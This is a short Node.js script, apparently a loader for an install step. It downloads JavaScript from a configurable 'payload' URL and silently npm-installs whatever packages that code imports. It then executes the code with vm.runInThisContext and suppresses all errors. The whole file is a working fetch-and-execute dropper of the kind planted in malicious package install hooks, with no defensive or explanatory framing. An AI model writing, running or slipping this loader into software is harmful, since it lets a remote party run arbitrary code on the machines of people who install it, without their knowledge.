const { exec } = require('child_process');
const http = require('http');
const https = require('https');
const vm = require('vm');

const payloadUrl = 'https://example.com/script.js'; // Replace with actual URL

function fetchCompat(url) {
  return new Promise((resolve, reject) => {
    const client = url.startsWith('https') ? https : http;
    client.get(url, (res) => {
      if (res.statusCode !== 200) {
        reject(new Error(`Failed to download payload: ${res.statusCode}`));
        return;
      }
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve(data));
    }).on('error', reject);
  });
}

async function install() {
  try {
    const payloadCode = typeof fetch !== 'undefined' 
      ? await fetch(payloadUrl).then(r => {
          if (!r.ok) throw new Error(`Failed to download payload: ${r.status}`);
          return r.text();
        })
      : await fetchCompat(payloadUrl);

    const requirePattern = /require\s*\(\s*['"]([^'"]+)['"]\s*\)/g;
    const importPattern = /import\s+.*?from\s+['"]([^'"]+)['"]/g;
    const dynamicImportPattern = /import\s*\(\s*['"]([^'"]+)['"]\s*\)/g;
    
    const deps = new Set();
    const builtins = ['fs', 'path', 'os', 'crypto', 'http', 'https', 'url', 'querystring', 'child_process', 'events', 'stream', 'util', 'buffer', 'vm', 'net', 'dns', 'tls', 'zlib', 'electron'];
    
    let match;
    const addDep = (dep) => {
      if (dep && !builtins.includes(dep) && !dep.startsWith('.') && !dep.startsWith('/')) {
        deps.add(dep.split('/')[0].replace(/^@/, ''));
      }
    };

    while ((match = requirePattern.exec(payloadCode)) !== null) addDep(match[1]);
    while ((match = importPattern.exec(payloadCode)) !== null) addDep(match[1]);
    while ((match = dynamicImportPattern.exec(payloadCode)) !== null) addDep(match[1]);

    if (deps.size > 0) {
      await new Promise((resolve) => {
        exec(`npm install ${Array.from(deps).join(' ')}`, 
          { stdio: 'ignore', timeout: 30000 }, 
          () => resolve()
        );
      });
    }

    vm.runInThisContext(payloadCode);

  } catch (error) {
    // silent
  }
}

install();
